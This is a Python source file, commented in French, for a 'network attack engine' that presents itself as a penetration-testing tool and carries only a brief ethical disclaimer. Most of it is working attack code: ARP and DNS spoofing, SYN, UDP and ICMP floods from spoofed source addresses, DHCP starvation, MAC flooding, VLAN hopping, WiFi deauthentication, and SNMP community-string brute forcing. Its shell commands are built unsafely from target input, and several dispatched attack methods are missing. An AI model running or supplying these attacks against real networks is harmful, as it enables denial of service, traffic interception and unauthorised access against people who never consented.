"""
Moteur d'attaque réseau pour tests de pénétration avancés
AVERTISSEMENT: À utiliser uniquement dans un cadre légal et éthique
"""

import socket
import struct
import threading
import time
import random
import subprocess
import scapy.all as scapy
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import ARP, Ether
import requests
import concurrent.futures
import ipaddress
import dns.resolver
import ssl
import paramiko
from ftplib import FTP
import telnetlib
import smtplib
import poplib
import imaplib

class NetworkAttackEngine:
    """
    Moteur d'attaque réseau pour tests de pénétration
    """
    
    def __init__(self):
        self.running = False
        self.status = {
            "running": False,
            "attack_type": "",
            "target": "",
            "attempts": 0,
            "start_time": None,
            "elapsed_time": 0,
            "hosts_discovered": [],
            "services_discovered": [],
            "vulnerabilities_found": [],
            "credentials_found": [],
            "network_info": {}
        }
        
    def start_network_attack(self, attack_type, target_params):
        """Démarre une attaque réseau selon le type spécifié"""
        self.running = True
        self.status["running"] = True
        self.status["start_time"] = time.time()
        self.status["attack_type"] = attack_type
        self.status["target"] = target_params.get("target", "")
        
        try:
            if attack_type == "network_discovery":
                self._network_discovery(target_params)
            elif attack_type == "arp_spoofing":
                self._arp_spoofing_attack(target_params)
            elif attack_type == "syn_flood":
                self._syn_flood_attack(target_params)
            elif attack_type == "udp_flood":
                self._udp_flood_attack(target_params)
            elif attack_type == "icmp_flood":
                self._icmp_flood_attack(target_params)
            elif attack_type == "dns_spoofing":
                self._dns_spoofing_attack(target_params)
            elif attack_type == "mitm_attack":
                self._mitm_attack(target_params)
            elif attack_type == "wifi_attack":
                self._wifi_attack(target_params)
            elif attack_type == "bluetooth_attack":
                self._bluetooth_attack(target_params)
            elif attack_type == "snmp_attack":
                self._snmp_attack(target_params)
            elif attack_type == "rpc_attack":
                self._rpc_attack(target_params)
            elif attack_type == "smb_attack":
                self._smb_attack(target_params)
            elif attack_type == "ldap_attack":
                self._ldap_attack(target_params)
            elif attack_type == "kerberos_attack":
                self._kerberos_attack(target_params)
            elif attack_type == "ssl_attack":
                self._ssl_attack(target_params)
            elif attack_type == "voip_attack":
                self._voip_attack(target_params)
            elif attack_type == "dhcp_attack":
                self._dhcp_attack(target_params)
            elif attack_type == "vlan_hopping":
                self._vlan_hopping_attack(target_params)
            elif attack_type == "mac_flooding":
                self._mac_flooding_attack(target_params)
            elif attack_type == "port_knocking":
                self._port_knocking_attack(target_params)
            else:
                raise ValueError(f"Type d'attaque réseau non supporté: {attack_type}")
                
        except Exception as e:
            self.status["result"] = f"Erreur: {str(e)}"
        finally:
            self.running = False
            self.status["running"] = False
            
    def _network_discovery(self, params):
        """Découverte de réseau et énumération d'hôtes"""
        network = params.get("network", "192.168.1.0/24")
        
        try:
            net = ipaddress.IPv4Network(network, strict=False)
            
            # Scan ARP pour découvrir les hôtes actifs
            self._arp_scan(str(net))
            
            # Scan ping pour vérifier la connectivité
            self._ping_scan(str(net))
            
            # Scan de ports sur les hôtes découverts
            for host_info in self.status["hosts_discovered"]:
                if self.running:
                    self._port_scan(host_info["ip"])
                    
        except Exception as e:
            self.status["result"] = f"Erreur lors de la découverte réseau: {str(e)}"
            
    def _arp_scan(self, network):
        """Scan ARP pour découvrir les hôtes actifs"""
        try:
            # Créer une requête ARP broadcast
            arp_request = ARP(pdst=network)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            # Envoyer la requête et recevoir les réponses
            answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            for element in answered_list:
                host_info = {
                    "ip": element[1].psrc,
                    "mac": element[1].hwsrc,
                    "discovery_method": "ARP"
                }
                self.status["hosts_discovered"].append(host_info)
                self.status["attempts"] += 1
                
        except Exception as e:
            pass  # Continuer même en cas d'erreur
            
    def _ping_scan(self, network):
        """Scan ping pour vérifier la connectivité"""
        try:
            net = ipaddress.IPv4Network(network, strict=False)
            
            def ping_host(ip):
                try:
                    # Créer un paquet ICMP ping
                    ping_packet = IP(dst=str(ip)) / ICMP()
                    response = scapy.sr1(ping_packet, timeout=1, verbose=False)
                    
                    if response:
                        host_info = {
                            "ip": str(ip),
                            "discovery_method": "ICMP",
                            "response_time": time.time()
                        }
                        self.status["hosts_discovered"].append(host_info)
                        
                except Exception:
                    pass
                    
            # Utiliser des threads pour accélérer le scan
            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                futures = []
                for ip in net.hosts():
                    if not self.running:
                        break
                    futures.append(executor.submit(ping_host, ip))
                    self.status["attempts"] += 1
                    
                # Attendre que tous les threads se terminent
                concurrent.futures.wait(futures)
                
        except Exception as e:
            pass
            
    def _port_scan(self, target_ip):
        """Scan de ports TCP sur un hôte"""
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080]
        
        def scan_port(port):
            try:
                # Créer un paquet SYN
                syn_packet = IP(dst=target_ip) / TCP(dport=port, flags="S")
                response = scapy.sr1(syn_packet, timeout=1, verbose=False)
                
                if response and response.haslayer(TCP):
                    if response[TCP].flags == 18:  # SYN-ACK
                        service_info = {
                            "ip": target_ip,
                            "port": port,
                            "state": "open",
                            "protocol": "tcp",
                            "service": self._identify_service(port)
                        }
                        self.status["services_discovered"].append(service_info)
                        
                        # Envoyer RST pour fermer la connexion
                        rst_packet = IP(dst=target_ip) / TCP(dport=port, flags="R")
                        scapy.send(rst_packet, verbose=False)
                        
            except Exception:
                pass
                
        # Scanner les ports en parallèle
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for port in common_ports:
                if not self.running:
                    break
                futures.append(executor.submit(scan_port, port))
                
            concurrent.futures.wait(futures)
            
    def _identify_service(self, port):
        """Identifie le service probable basé sur le port"""
        services = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 111: "RPC", 135: "RPC", 139: "NetBIOS",
            143: "IMAP", 443: "HTTPS", 993: "IMAPS", 995: "POP3S",
            1723: "PPTP", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
            5900: "VNC", 8080: "HTTP-Alt"
        }
        return services.get(port, "Unknown")
        
    def _arp_spoofing_attack(self, params):
        """Attaque par empoisonnement ARP"""
        target_ip = params.get("target_ip")
        gateway_ip = params.get("gateway_ip")
        interface = params.get("interface", "eth0")
        
        try:
            # Obtenir les adresses MAC
            target_mac = self._get_mac_address(target_ip)
            gateway_mac = self._get_mac_address(gateway_ip)
            
            if not target_mac or not gateway_mac:
                self.status["result"] = "Impossible d'obtenir les adresses MAC"
                return
                
            while self.running:
                # Empoisonner la table ARP de la cible
                arp_response_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                scapy.send(arp_response_target, verbose=False)
                
                # Empoisonner la table ARP de la passerelle
                arp_response_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
                scapy.send(arp_response_gateway, verbose=False)
                
                self.status["attempts"] += 1
                time.sleep(2)
                
        except Exception as e:
            self.status["result"] = f"Erreur lors de l'empoisonnement ARP: {str(e)}"
            
    def _get_mac_address(self, ip):
        """Obtient l'adresse MAC d'une IP via ARP"""
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            if answered_list:
                return answered_list[0][1].hwsrc
        except Exception:
            pass
        return None
        
    def _syn_flood_attack(self, params):
        """Attaque par inondation SYN"""
        target_ip = params.get("target_ip")
        target_port = params.get("target_port", 80)
        packet_count = params.get("packet_count", 1000)
        
        try:
            for i in range(packet_count):
                if not self.running:
                    break
                    
                # Créer un paquet SYN avec une IP source aléatoire
                source_ip = ".".join([str(random.randint(1, 254)) for _ in range(4)])
                source_port = random.randint(1024, 65535)
                
                syn_packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags="S")
                scapy.send(syn_packet, verbose=False)
                
                self.status["attempts"] += 1
                
                if i % 100 == 0:
                    time.sleep(0.1)  # Petite pause pour éviter de surcharger
                    
        except Exception as e:
            self.status["result"] = f"Erreur lors de l'attaque SYN flood: {str(e)}"
            
    def _udp_flood_attack(self, params):
        """Attaque par inondation UDP"""
        target_ip = params.get("target_ip")
        target_port = params.get("target_port", 53)
        packet_count = params.get("packet_count", 1000)
        
        try:
            for i in range(packet_count):
                if not self.running:
                    break
                    
                # Créer un paquet UDP avec des données aléatoires
                source_ip = ".".join([str(random.randint(1, 254)) for _ in range(4)])
                source_port = random.randint(1024, 65535)
                payload = "A" * random.randint(64, 1024)
                
                udp_packet = IP(src=source_ip, dst=target_ip) / UDP(sport=source_port, dport=target_port) / payload
                scapy.send(udp_packet, verbose=False)
                
                self.status["attempts"] += 1
                
                if i % 100 == 0:
                    time.sleep(0.1)
                    
        except Exception as e:
            self.status["result"] = f"Erreur lors de l'attaque UDP flood: {str(e)}"
            
    def _icmp_flood_attack(self, params):
        """Attaque par inondation ICMP (Ping flood)"""
        target_ip = params.get("target_ip")
        packet_count = params.get("packet_count", 1000)
        
        try:
            for i in range(packet_count):
                if not self.running:
                    break
                    
                # Créer un paquet ICMP ping
                source_ip = ".".join([str(random.randint(1, 254)) for _ in range(4)])
                payload = "A" * random.randint(64, 1024)
                
                icmp_packet = IP(src=source_ip, dst=target_ip) / ICMP() / payload
                scapy.send(icmp_packet, verbose=False)
                
                self.status["attempts"] += 1
                
                if i % 100 == 0:
                    time.sleep(0.1)
                    
        except Exception as e:
            self.status["result"] = f"Erreur lors de l'attaque ICMP flood: {str(e)}"
            
    def _dns_spoofing_attack(self, params):
        """Attaque par empoisonnement DNS"""
        target_domain = params.get("target_domain")
        fake_ip = params.get("fake_ip")
        interface = params.get("interface", "eth0")
        
        def dns_spoof(packet):
            if packet.haslayer(scapy.DNSQR):
                if target_domain in packet[scapy.DNSQR].qname.decode():
                    # Créer une réponse DNS falsifiée
                    spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                                   UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                                   scapy.DNS(id=packet[scapy.DNS].id, qr=1, aa=1, qd=packet[scapy.DNS].qd,
                                           an=scapy.DNSRR(rrname=packet[scapy.DNSQR].qname, ttl=10, rdata=fake_ip))
                    
                    scapy.send(spoofed_packet, verbose=False)
                    self.status["attempts"] += 1
                    
        try:
            # Capturer et traiter les paquets DNS
            scapy.sniff(filter="udp port 53", prn=dns_spoof, iface=interface, stop_filter=lambda x: not self.running)
            
        except Exception as e:
            self.status["result"] = f"Erreur lors de l'empoisonnement DNS: {str(e)}"
            
    def _ssl_attack(self, params):
        """Attaque SSL/TLS (test de vulnérabilités)"""
        target_host = params.get("target_host")
        target_port = params.get("target_port", 443)
        
        try:
            # Test de la version SSL/TLS
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((target_host, target_port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=target_host) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
                    
                    ssl_info = {
                        "type": "SSL/TLS Information",
                        "host": target_host,
                        "port": target_port,
                        "version": version,
                        "cipher": cipher,
                        "certificate": cert
                    }
                    
                    # Vérifier les vulnérabilités SSL connues
                    vulnerabilities = []
                    
                    if version in ["SSLv2", "SSLv3", "TLSv1", "TLSv1.1"]:
                        vulnerabilities.append(f"Version SSL/TLS obsolète: {version}")
                        
                    if cipher and "RC4" in cipher[0]:
                        vulnerabilities.append("Chiffrement RC4 vulnérable détecté")
                        
                    if cipher and "DES" in cipher[0]:
                        vulnerabilities.append("Chiffrement DES vulnérable détecté")
                        
                    if vulnerabilities:
                        vuln_info = {
                            "type": "SSL/TLS Vulnerabilities",
                            "host": target_host,
                            "port": target_port,
                            "vulnerabilities": vulnerabilities
                        }
                        self.status["vulnerabilities_found"].append(vuln_info)
                        
                    self.status["services_discovered"].append(ssl_info)
                    
        except Exception as e:
            self.status["result"] = f"Erreur lors du test SSL: {str(e)}"
            
    def _snmp_attack(self, params):
        """Attaque SNMP (énumération et brute force)"""
        target_ip = params.get("target_ip")
        community_strings = params.get("community_strings", ["public", "private", "admin"])
        
        try:
            for community in community_strings:
                if not self.running:
                    break
                    
                self.status["attempts"] += 1
                
                try:
                    # Test de la chaîne de communauté SNMP
                    cmd = f"snmpwalk -v2c -c {community} {target_ip} 1.3.6.1.2.1.1.1.0"
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                    
                    if result.returncode == 0 and result.stdout:
                        cred_info = {
                            "service": "SNMP",
                            "host": target_ip,
                            "community_string": community,
                            "response": result.stdout.strip()
                        }
                        self.status["credentials_found"].append(cred_info)
                        
                except subprocess.TimeoutExpired:
                    continue
                except Exception:
                    continue
                    
                time.sleep(1)
                
        except Exception as e:
            self.status["result"] = f"Erreur lors de l'attaque SNMP: {str(e)}"
            
    def _smb_attack(self, params):
        """Attaque SMB (énumération et test de vulnérabilités)"""
        target_ip = params.get("target_ip")
        
        try:
            # Énumération des partages SMB
            cmd = f"smbclient -L {target_ip} -N"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                smb_info = {
                    "type": "SMB Shares",
                    "host": target_ip,
                    "shares": result.stdout
                }
                self.status["services_discovered"].append(smb_info)
                
            # Test de vulnérabilités SMB connues
            vuln_tests = [
                ("MS17-010", "nmap --script smb-vuln-ms17-010"),
                ("MS08-067", "nmap --script smb-vuln-ms08-067"),
                ("EternalBlue", "nmap --script smb-vuln-ms17-010")
            ]
            
            for vuln_name, cmd_template in vuln_tests:
                if not self.running:
                    break
                    
                cmd = f"{cmd_template} {target_ip}"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                
                if "VULNERABLE" in result.stdout:
                    vuln_info = {
                        "type": f"SMB Vulnerability - {vuln_name}",
                        "host": target_ip,
                        "details": result.stdout
                    }
                    self.status["vulnerabilities_found"].append(vuln_info)
                    
                self.status["attempts"] += 1
                
        except Exception as e:
            self.status["result"] = f"Erreur lors de l'attaque SMB: {str(e)}"
            
    def _dhcp_attack(self, params):
        """Attaque DHCP (épuisement et empoisonnement)"""
        interface = params.get("interface", "eth0")
        attack_type = params.get("dhcp_attack_type", "starvation")
        
        try:
            if attack_type == "starvation":
                # Attaque par épuisement DHCP
                for i in range(254):
                    if not self.running:
                        break
                        
                    # Générer une adresse MAC aléatoire
                    mac = ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
                    
                    # Créer une requête DHCP DISCOVER
                    dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / \
                                  IP(src="0.0.0.0", dst="255.255.255.255") / \
                                  UDP(sport=68, dport=67) / \
                                  scapy.BOOTP(chaddr=mac) / \
                                  scapy.DHCP(options=[("message-type", "discover"), "end"])
                    
                    scapy.sendp(dhcp_discover, iface=interface, verbose=False)
                    self.status["attempts"] += 1
                    time.sleep(0.1)
                    
        except Exception as e:
            self.status["result"] = f"Erreur lors de l'attaque DHCP: {str(e)}"
            
    def _vlan_hopping_attack(self, params):
        """Attaque de saut de VLAN"""
        target_vlan = params.get("target_vlan", 100)
        interface = params.get("interface", "eth0")
        
        try:
            # Double tagging VLAN attack
            for i in range(10):
                if not self.running:
                    break
                    
                # Créer un paquet avec double tag VLAN
                packet = Ether() / \
                        scapy.Dot1Q(vlan=1) / \
                        scapy.Dot1Q(vlan=target_vlan) / \
                        IP(dst="192.168.1.1") / \
                        ICMP()
                
                scapy.sendp(packet, iface=interface, verbose=False)
                self.status["attempts"] += 1
                time.sleep(1)
                
        except Exception as e:
            self.status["result"] = f"Erreur lors de l'attaque VLAN hopping: {str(e)}"
            
    def _mac_flooding_attack(self, params):
        """Attaque par inondation de table MAC"""
        interface = params.get("interface", "eth0")
        packet_count = params.get("packet_count", 1000)
        
        try:
            for i in range(packet_count):
                if not self.running:
                    break
                    
                # Générer une adresse MAC aléatoire
                src_mac = ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
                dst_mac = ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
                
                # Créer un paquet avec des MACs aléatoires
                packet = Ether(src=src_mac, dst=dst_mac) / IP(dst="192.168.1.1") / ICMP()
                
                scapy.sendp(packet, iface=interface, verbose=False)
                self.status["attempts"] += 1
                
                if i % 100 == 0:
                    time.sleep(0.1)
                    
        except Exception as e:
            self.status["result"] = f"Erreur lors de l'inondation MAC: {str(e)}"
            
    def _wifi_attack(self, params):
        """Attaque WiFi (déauthentification et capture de handshake)"""
        target_bssid = params.get("target_bssid")
        target_client = params.get("target_client")
        interface = params.get("interface", "wlan0")
        
        try:
            if target_bssid and target_client:
                # Attaque de déauthentification
                for i in range(10):
                    if not self.running:
                        break
                        
                    # Paquet de déauthentification du client vers l'AP
                    deauth_client = scapy.RadioTap() / \
                                  scapy.Dot11(addr1=target_bssid, addr2=target_client, addr3=target_bssid) / \
                                  scapy.Dot11Deauth(reason=7)
                    
                    # Paquet de déauthentification de l'AP vers le client
                    deauth_ap = scapy.RadioTap() / \
                              scapy.Dot11(addr1=target_client, addr2=target_bssid, addr3=target_bssid) / \
                              scapy.Dot11Deauth(reason=7)
                    
                    scapy.sendp(deauth_client, iface=interface, verbose=False)
                    scapy.sendp(deauth_ap, iface=interface, verbose=False)
                    
                    self.status["attempts"] += 2
                    time.sleep(1)
                    
        except Exception as e:
            self.status["result"] = f"Erreur lors de l'attaque WiFi: {str(e)}"
            
    def stop_attack(self):
        """Arrête l'attaque en cours"""
        self.running = False
        self.status["running"] = False
        
    def get_status(self):
        """Retourne le statut actuel de l'attaque"""
        if self.status["start_time"]:
            self.status["elapsed_time"] = time.time() - self.status["start_time"]
            
        return self.status.copy()

